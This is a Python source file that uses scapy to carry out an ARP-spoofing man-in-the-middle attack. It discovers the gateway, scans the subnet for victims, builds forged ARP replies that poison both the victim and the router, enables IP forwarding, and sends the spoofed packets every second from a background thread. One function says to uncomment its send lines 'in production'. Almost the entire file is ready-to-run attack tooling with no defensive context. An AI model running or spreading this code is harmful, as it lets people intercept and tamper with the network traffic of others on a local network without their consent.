import subprocess
import re
import ipaddress
from scapy.all import ARP, Ether, srp, send
import threading
import time

def get_gateway_info():
    """
    Detect the gateway IP address and MAC address for the current network using the `arp` command.

    Returns:
        dict: Dictionary with `ip`, `mac`, and `raw_output` keys, or None if it cannot be determined.
    """
    try:
        result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode != 0:
            return {"error": f"Error executing arp command: {result.stderr}"}

        arp_output = result.stdout
        gateway_match = re.search(r'_gateway\s+\(([\d.]+)\)\s+at\s+([\w:]+)', arp_output, re.IGNORECASE)

        if gateway_match:
            return {
                "ip": gateway_match.group(1),
                "mac": gateway_match.group(2),
                "raw_output": arp_output
            }
        else:
            return {"error": "Gateway IP not found in arp output.", "raw_output": arp_output}

    except FileNotFoundError:
        return {"error": "The arp command is not available on this system."}
    except Exception as e:
        return {"error": f"An error occurred: {e}"}

def scan_network(ip_range):
    """
    Scans the network for active devices in the specified IP range.

    Args:
        ip_range (str): The IP range to scan in CIDR notation (e.g., '192.168.1.0/24').

    Returns:
        list: List of dictionaries with `ip` and `mac` keys for each discovered device.
    """
    try:
        ip_network = ipaddress.ip_network(ip_range, strict=False)
        arp = ARP(pdst=str(ip_network))
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=2, verbose=False)[0]

        devices = []
        for sent, received in result:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})
        return devices
    except ValueError as e:
        raise ValueError(f"Invalid IP range: {ip_range}") from e
    except Exception as e:
        raise RuntimeError(f"Error scanning network: {e}") from e

def spoof_both(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """
    Spoofs both the victim and the gateway to enable a man-in-the-middle attack.

    Args:
        victim_ip (str): IP address of the victim.
        victim_mac (str): MAC address of the victim.
        gateway_ip (str): IP address of the gateway.
        gateway_mac (str): MAC address of the gateway.

    Returns:
        dict: Details about the spoofing actions for both victim and gateway.
    """
    try:
        # ARP spoofing packet for the victim (pretend to be the gateway)
        victim_packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)

        # ARP spoofing packet for the gateway (pretend to be the victim)
        gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
        print("Victim_packet")
        print(victim_packet.show())
        print(victim_packet.summary())
        
        print("Gateway_packet")
        print(gateway_packet.show())
        print(gateway_packet.summary())

        # Uncomment these lines in production to send the packets
        # send(victim_packet, verbose=False)
        # send(gateway_packet, verbose=False)

        # Return debug information for both spoofing actions
        return {
            "victim_spoof": {
                "hwsrc": victim_packet.hwsrc,
                "hwdst": victim_packet.hwdst,
                "pdst": victim_packet.pdst,
                "psrc": victim_packet.psrc
            },
            "gateway_spoof": {
                "hwsrc": gateway_packet.hwsrc,
                "hwdst": gateway_packet.hwdst,
                "pdst": gateway_packet.pdst,
                "psrc": gateway_packet.psrc
            }
        }
    except Exception as e:
        raise RuntimeError(f"Error during ARP spoofing: {e}")
    
    
# Global variable to control the spoofing thread
spoofing_active = False

def enable_port_forwarding():
    """
    Enable port forwarding on the host machine by writing to /proc/sys/net/ipv4/ip_forward.
    """
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    except Exception as e:
        raise RuntimeError(f"Failed to enable port forwarding: {e}")

def start_spoofing_continuous(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """
    Start sending spoofing packets continuously in a separate thread.
    """
    def spoofing_thread():
        global spoofing_active
        while spoofing_active:
            # Send spoofing packets
            victim_packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
            gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
            print("victim_packet")
            print(victim_packet.show())
            print(victim_packet.summary())
            print("Gateway_packet")
            print(gateway_packet.show())
            print(gateway_packet.summary())
            send(victim_packet, verbose=False)
            send(gateway_packet, verbose=False)
            time.sleep(1)  # Send a packet every second

    global spoofing_active
    spoofing_active = True
    enable_port_forwarding()  # Enable port forwarding
    thread = threading.Thread(target=spoofing_thread)
    thread.daemon = True
    thread.start()

def stop_spoofing():
    """
    Stop the continuous spoofing process.
    """
    global spoofing_active
    spoofing_active = False
